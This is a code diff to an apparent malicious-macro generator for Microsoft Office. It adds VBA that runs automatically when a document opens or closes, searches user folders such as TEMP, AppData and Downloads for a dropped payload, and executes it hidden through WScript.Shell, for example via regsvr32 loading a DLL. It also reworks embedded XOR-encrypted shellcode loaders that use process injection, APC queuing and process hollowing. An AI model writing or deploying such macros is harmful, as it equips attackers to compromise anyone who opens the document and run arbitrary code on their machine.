@@ -16,6 +16,7 @@ Features:
 - Support for both 32-bit and 64-bit Office
 """
 
+import re
 import sys
 from pathlib import Path
 
@@ -608,19 +609,200 @@ End Function
 
         return obfuscated
 
+    # Executable extensions that may appear as payload tokens in a command string.
+    _PAYLOAD_EXTENSIONS = re.compile(
+        r'\b([A-Za-z0-9_\-]+\.(exe|dll|bat|ps1|vbs|js|hta|scr|com))\b',
+        re.IGNORECASE,
+    )
+
+    # System binaries that are always at known paths - never search for these.
+    _SYSTEM_BINARIES = {
+        'cmd.exe', 'powershell.exe', 'wscript.exe', 'cscript.exe',
+        'mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'msiexec.exe',
+        'conhost.exe', 'explorer.exe', 'svchost.exe', 'certutil.exe',
+    }
+
+    def _find_payload_token(self, trigger_binary: str, trigger_command: str):
+        """
+        Return (payload_filename, search_in_command) where payload_filename is
+        the bare filename to search for at runtime and search_in_command is True
+        when the token lives inside trigger_command (requiring Replace substitution)
+        rather than being the trigger_binary itself.
+
+        Priority:
+        1. First non-system executable token found inside trigger_command.
+        2. Basename of trigger_binary, if it is not a system binary.
+        3. None - nothing to search for dynamically.
+        """
+        import os
+
+        # Scan trigger_command for non-system payload tokens
+        for m in self._PAYLOAD_EXTENSIONS.finditer(trigger_command):
+            token = m.group(1)
+            if token.lower() not in self._SYSTEM_BINARIES:
+                return token, True   # found in command → Replace substitution
+
+        # Fall back to trigger_binary basename
+        basename = os.path.basename(trigger_binary)
+        if basename.lower() not in self._SYSTEM_BINARIES:
+            return basename, False   # the binary itself needs resolving
+
+        return None, False
+
     def generate_command_execution_vba(self, trigger_binary, trigger_command, trigger_type="AutoOpen"):
         """
         Generate VBA code that executes a command via WScript.Shell.
 
+        The macro enumerates common filesystem locations to resolve the payload
+        filename at runtime rather than relying on a hardcoded path.
+
+        Resolution strategy:
+        - If trigger_command contains a non-system executable/DLL token (e.g.
+          "regsvr32.exe erebus.dll"), that token is located via FindPayload and
+          substituted back into the command with its full resolved path.
+        - If trigger_binary itself is a custom binary (not a known system binary),
+          FindPayload is used to resolve its path.
+        - If nothing needs dynamic resolution the command is executed as-is.
+
         Args:
-            trigger_binary (str): Path to executable to run
-            trigger_command (str): Command arguments to pass
+            trigger_binary (str): Path/name of executable to run
+            trigger_command (str): Arguments passed to trigger_binary
             trigger_type (str): Trigger type (AutoOpen, OnClose, OnSave)
 
         Returns:
             str: VBA code for command execution
         """
-        vba_code = f"""
+        payload_token, in_command = self._find_payload_token(trigger_binary, trigger_command)
+
+        # FSO-based helpers shared by all exec sub variants.
+        # RecursiveSearch: depth-first traversal, skips reparse points.
+        # StackSearch: iterative BFS via Collection stack - no recursion depth limit.
+        # FindPayload: direct-check first, then RecursiveSearch per candidate folder.
+        find_payload_func = """
+' Depth-first recursive search for targetFile inside folder.
+Private Function RecursiveSearch(ByVal folder As Object, ByVal targetFile As String, ByVal fso As Object) As String
+    Dim subFolder As Object
+    Dim f As Object
+    Dim found As String
+
+    On Error Resume Next
+
+    For Each f In folder.Files
+        If StrComp(f.Name, targetFile, vbTextCompare) = 0 Then
+            RecursiveSearch = f.Path
+            Exit Function
+        End If
+    Next f
+
+    For Each subFolder In folder.SubFolders
+        If (subFolder.Attributes And 1024) = 0 Then
+            found = RecursiveSearch(subFolder, targetFile, fso)
+            If Len(found) > 0 Then
+                RecursiveSearch = found
+                Exit Function
+            End If
+        End If
+    Next subFolder
+
+    On Error GoTo 0
+    RecursiveSearch = vbNullString
+End Function
+
+' Iterative stack-based search - avoids call-stack overflow on deep trees.
+Private Function StackSearch(ByVal startPath As String, ByVal targetFile As String) As String
+    Dim fso As Object
+    Dim folderStack As Object
+    Dim currentFolder As Object
+    Dim subFolder As Object
+    Dim f As Object
+    Dim currentPath As String
+
+    If Len(startPath) = 0 Then Exit Function
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(startPath) Then Exit Function
+
+    Set folderStack = New Collection
+    folderStack.Add startPath
+
+    Do While folderStack.Count > 0
+        currentPath = folderStack(folderStack.Count)
+        folderStack.Remove folderStack.Count
+
+        If fso.FolderExists(currentPath) Then
+            Set currentFolder = fso.GetFolder(currentPath)
+            On Error Resume Next
+            For Each f In currentFolder.Files
+                If StrComp(f.Name, targetFile, vbTextCompare) = 0 Then
+                    StackSearch = f.Path
+                    Set fso = Nothing
+                    Exit Function
+                End If
+            Next f
+            For Each subFolder In currentFolder.SubFolders
+                If (subFolder.Attributes And 1024) = 0 Then
+                    folderStack.Add subFolder.Path
+                End If
+            Next subFolder
+            On Error GoTo 0
+        End If
+    Loop
+
+    Set fso = Nothing
+    StackSearch = vbNullString
+End Function
+
+' Walk common drop locations (direct check + recursive) and return the full path.
+' Returns fallbackPath when the file cannot be found anywhere.
+Private Function FindPayload(ByVal fileName As String, ByVal fallbackPath As String) As String
+    Dim candidates() As String
+    Dim i As Long
+    Dim candidate As String
+    Dim fso As Object
+    Dim found As String
+
+    ReDim candidates(0 To 11)
+    candidates(0)  = ThisWorkbook.Path
+    candidates(1)  = Environ("TEMP")
+    candidates(2)  = Environ("TMP")
+    candidates(3)  = Environ("APPDATA")
+    candidates(4)  = Environ("LOCALAPPDATA")
+    candidates(5)  = Environ("USERPROFILE") & "\\Desktop"
+    candidates(6)  = Environ("USERPROFILE") & "\\Downloads"
+    candidates(7)  = Environ("USERPROFILE") & "\\Documents"
+    candidates(8)  = Environ("USERPROFILE")
+    candidates(9)  = Environ("OneDrive") & "\\Desktop"
+    candidates(10) = Environ("OneDrive") & "\\Downloads"
+    candidates(11) = Environ("OneDrive") & "\\Documents"
+
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    For i = LBound(candidates) To UBound(candidates)
+        If Len(candidates(i)) > 0 Then
+            candidate = fso.BuildPath(candidates(i), fileName)
+            If fso.FileExists(candidate) Then
+                FindPayload = candidate
+                Set fso = Nothing
+                Exit Function
+            End If
+            If fso.FolderExists(candidates(i)) Then
+                found = RecursiveSearch(fso.GetFolder(candidates(i)), fileName, fso)
+                If Len(found) > 0 Then
+                    FindPayload = found
+                    Set fso = Nothing
+                    Exit Function
+                End If
+            End If
+        End If
+    Next i
+
+    Set fso = Nothing
+    FindPayload = fallbackPath
+End Function
+"""
+
+        if payload_token is None:
+            # Nothing to search - run the command exactly as configured.
+            exec_sub = f"""
 Sub {trigger_type}()
     On Error Resume Next
     Dim shell As Object
@@ -628,10 +810,49 @@ Sub {trigger_type}()
     Set shell = CreateObject("WScript.Shell")
     cmd = "{trigger_binary} {trigger_command}"
     shell.Run cmd, 0, False
+    Set shell = Nothing
     ThisWorkbook.Close False
 End Sub
 """
-        return vba_code
+            return exec_sub
+
+        if in_command:
+            # Payload lives inside trigger_command (e.g. "regsvr32.exe erebus.dll").
+            # Resolve the filename, quote the result, and substitute it back.
+            exec_sub = f"""
+Sub {trigger_type}()
+    On Error Resume Next
+    Dim shell As Object
+    Dim payloadPath As String
+    Dim cmd As String
+    Set shell = CreateObject("WScript.Shell")
+    payloadPath = FindPayload("{payload_token}", "{payload_token}")
+    If Dir(payloadPath) = "" Then Exit Sub
+    cmd = "{trigger_binary} " & Replace("{trigger_command}", "{payload_token}", Chr(34) & payloadPath & Chr(34))
+    shell.Run cmd, 0, False
+    Set shell = Nothing
+    ThisWorkbook.Close False
+End Sub
+"""
+        else:
+            # trigger_binary itself is the payload (custom binary, not a system tool).
+            exec_sub = f"""
+Sub {trigger_type}()
+    On Error Resume Next
+    Dim shell As Object
+    Dim binaryPath As String
+    Dim cmd As String
+    Set shell = CreateObject("WScript.Shell")
+    binaryPath = FindPayload("{payload_token}", "{trigger_binary}")
+    If Dir(binaryPath) = "" Then Exit Sub
+    cmd = Chr(34) & binaryPath & Chr(34) & " {trigger_command}"
+    shell.Run cmd, 0, False
+    Set shell = Nothing
+    ThisWorkbook.Close False
+End Sub
+"""
+
+        return find_payload_func + exec_sub
 
     def chunk_shellcode_array(self, vba_shellcode, max_line_length=200):
         """
@@ -696,19 +917,16 @@ End Sub
         # Generate code with independent array declarations
         chunked_code = ""
 
-        # IMPORTANT: In VBA, all Dim declarations must come BEFORE any executable statements
-        # Declare shellcode variable first at module level
-        chunked_code += "Dim shellcode As Variant\n"
-
         # Add key array (usually small, fits on one line)
         key_values = [int(x.strip()) for x in key_data.split(',')]
         key_array_str = ",".join(str(v) for v in key_values)
         chunked_code += f"key = Array({key_array_str})\n"
 
-        # Create individual chunk arrays - each declaration is self-contained
+        # Create individual chunk arrays - Dim each part to satisfy Option Explicit
         for i, chunk in enumerate(chunks):
             chunk_str = ",".join(str(v) for v in chunk)
-            chunked_code += f"shellcode_part{i} = Array({chunk_str})\n"
+            chunked_code += f"    Dim shellcode_part{i} As Variant\n"
+            chunked_code += f"    shellcode_part{i} = Array({chunk_str})\n"
 
         # Combine all chunks into single shellcode array
         if len(chunks) == 1:
@@ -810,21 +1028,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -842,6 +1058,8 @@ Sub ExecuteShellcode()
     Dim threadId As Long
     Dim shellcodeSize As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
@@ -928,21 +1146,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -959,6 +1175,8 @@ Sub ExecuteViaCallback()
     Dim shellcodeSize As Long
     Dim result As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
@@ -1044,21 +1262,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -1076,6 +1292,8 @@ Sub ExecuteViaAPC()
     Dim shellcodeSize As Long
     Dim result As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
@@ -1207,21 +1425,19 @@ Function ConcatenateArrays(arr1 As Variant, arr2 As Variant) As Variant
     ConcatenateArrays = combined
 End Function
 
-{chunked_shellcode}
-
 ' XOR decryption routine
 Function XorDecrypt(encrypted As Variant, key As Variant) As Variant
     Dim decrypted() As Byte
     Dim i As Long
     Dim keyLen As Long
-    
+
     keyLen = UBound(key) - LBound(key) + 1
     ReDim decrypted(LBound(encrypted) To UBound(encrypted))
-    
+
     For i = LBound(encrypted) To UBound(encrypted)
         decrypted(i) = encrypted(i) Xor key((i - LBound(encrypted)) Mod keyLen)
     Next i
-    
+
     XorDecrypt = decrypted
 End Function
 
@@ -1241,6 +1457,8 @@ Sub ExecuteViaHollowing()
     Dim bytesWritten As LongPtr
     Dim result As Long
     Dim decrypted As Variant
+
+    {chunked_shellcode}
 
     ' Decrypt shellcode using XOR
     decrypted = XorDecrypt(shellcode, key)
